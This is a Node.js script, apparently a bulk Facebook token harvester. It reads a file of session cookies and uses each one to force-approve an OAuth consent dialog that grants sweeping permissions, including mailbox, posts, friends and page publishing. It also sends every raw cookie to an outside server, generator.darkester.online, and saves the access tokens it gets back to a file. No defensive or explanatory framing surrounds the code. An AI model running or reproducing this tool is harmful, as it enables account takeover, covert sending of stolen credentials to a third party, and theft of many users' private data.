const axios = require('axios');
const fs = require('fs');
const path = require('path');

const searchToken = async (cookies) => {

    try {
        const url = 'https://web.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/';
        

        // Step 1: Initial request (allow redirect)
        const initialResponse = await axios.get(url, {
            headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Cookie': cookies
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        });

        let redirectUrl = initialResponse.headers.location;
        if (!redirectUrl) throw new Error('No redirect location found');

        // Step 2: Follow 302 redirect and get HTML
        const redirectResponse = await axios.get(redirectUrl, {
            headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Cookie': cookies,
            'Referer': url
            }
        });

        // Step 3: Extract logger_id and encrypted_post_body from HTML
        const html = redirectResponse.data;
        //console.log(html);
        //fs.writeFileSync('data.txt', html, 'utf8');
        //const loggerIdMatch = html.match(/name="logger_id"\s+value="([^"]+)"/);
        const encryptedPostBodyMatch = html.match(/name=\\"encrypted_post_body\\" value=\\"([^\\"]+)\\"/);
        const fbDtsgMatch = html.match(/name=\\"fb_dtsg\\" value=\\"([^\\"]+)\\"/);
        const jazoestMatch = html.match(/name=\\"jazoest\\" value=\\"([^\\"]+)\\"/);
        const loggerIdMatch = html.match(/name=\\"logger_id\\" value=\\"([^\\"]+)\\"/);
        const scopeMatch = html.match(/name=\\"scope\\" value=\\"([^\\"]+)\\"/);

        //name=\"fb_dtsg\" value=\"NAfuAIiJXWQrPdiP4XTNuucWTDRBFUiRz0WzirutQY0GlehOJTuFWjg:24:1750531309\"
        //name=\"jazoest\" value=\"25663\"
        //name=\"logger_id\" value=\"bd4b4d6d-b536-42ab-91f9-d2c6e98498d9\"
        //name=\"scope\" value=\"AXSTpILtmSdr-_gAzBZhGU62zzuCXYKzK1Xay_zpVuKE8JW8AxRRWVPt_slEZqlyppE\"


        if (!encryptedPostBodyMatch || !fbDtsgMatch || !jazoestMatch || !scopeMatch) {
            throw new Error('Required fields not found in HTML');
        }

        const logger_id = loggerIdMatch[1];
        const encrypted_post_body = encryptedPostBodyMatch[1];
        const fb_dtsg = fbDtsgMatch[1];
        const jazoest = jazoestMatch[1];
        const scope = scopeMatch[1];

        // console.log('logger_id:', logger_id);
        // console.log('encrypted_post_body:', encrypted_post_body);
        // console.log('fb_dtsg:', fb_dtsg);
        // console.log('jazoest:', jazoest);
        // console.log('scope:', scope);

        // Step 4: POST to skip/submit
        const postUrl = 'https://www.facebook.com/v1.0/dialog/oauth/skip/submit/';
        const postBody = new URLSearchParams({
            jazoest,
            fb_dtsg,
            from_post: '1',
            __CONFIRM__: '1',
            scope,
            display: 'page',
            sdk: '',
            sdk_version: '',
            domain: '',
            sso_device: '',
            state: '',
            user_code: '',
            nonce: '',
            logger_id,
            auth_type: '',
            auth_nonce: '',
            code_challenge: '',
            code_challenge_method: '',
            encrypted_post_body,
            'return_format[]': 'access_token'
        }).toString();

        const postResponse = await axios.post(postUrl, postBody, {
            headers: {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '0.75',
            'priority': 'u=0, i',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="8.0.0.0", "Chromium";v="138.0.7204.97", "Google Chrome";v="138.0.7204.97"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'viewport-width': '1340',
            'cookie': cookies,
            'Referer': redirectUrl,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        });

        //fs.writeFileSync('respons.txt', typeof postResponse.data === 'string' ? postResponse.data : JSON.stringify(postResponse.data, null, 2), 'utf8');

        // Step 5: Find access_token in response (in headers.location or body)
        // let accessToken;
        // if (postResponse.headers.location) {
        //     const tokenMatch = postResponse.headers.location.match(/access_token=([^&]+)/);
        //     if (tokenMatch) accessToken = tokenMatch[1];
        // }
        // if (!accessToken && typeof postResponse.data === 'string') {
        //     const tokenMatch = postResponse.data.match(/access_token=([^&"'<]+)/);
        //     if (tokenMatch) accessToken = tokenMatch[1];
        // }

        // if (accessToken) {
        //     console.log('Access Token:', accessToken);
        // } else {
        //     console.log('Access token not found');
        // }

        if (postResponse) {
            // Ambil cookie 'c' dari cokis.txt
            const cookieC = cookies;

            // Kirim POST ke https://generator.darkester.online/ pakai axios
            const genResponse = await axios.post(
                "https://generator.darkester.online/",
                `cookie=${encodeURIComponent(cookieC)}`,
                {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "content-type": "application/x-www-form-urlencoded",
                    }
                }
            );
            // Ambil token EAAB... dari response HTML
            const eaabMatch = genResponse.data.match(/(EAAB\w+)/);
            if (eaabMatch) {
                console.log('[✓] ', eaabMatch[1]);
                fs.writeFileSync('token.txt', eaabMatch[1] + '\n');
            } else {
                console.log('[!] token not found in response!');
            }
        }
    } catch (error) {
        if (error.response) {
            console.log('Status:', error.response.status);
            console.log('Headers:', error.response.headers);
            console.log('Data:', error.response.data);
        } else {
            console.error('Error:', error.message);
        }
    }

};

(async () => {
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    const cookiesFile = path.join(__dirname, 'cokis.txt');
    const cookiesList = fs.readFileSync(cookiesFile, 'utf8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0);

    const concurrency = 3; // jumlah paralel browser
    let index = 0;

    const runBatch = async () => {
        while (index < cookiesList.length) {
            const batch = [];
            for (let i = 0; i < concurrency && index < cookiesList.length; i++, index++) {
                const cookies = cookiesList[index];
                batch.push(
                    (async () => {
                        await delay(i * 2000); // delay antar browser
                        await searchToken(cookies);
                    })()
                );
            }
            await Promise.all(batch);
        }
    };

    await runBatch();
})();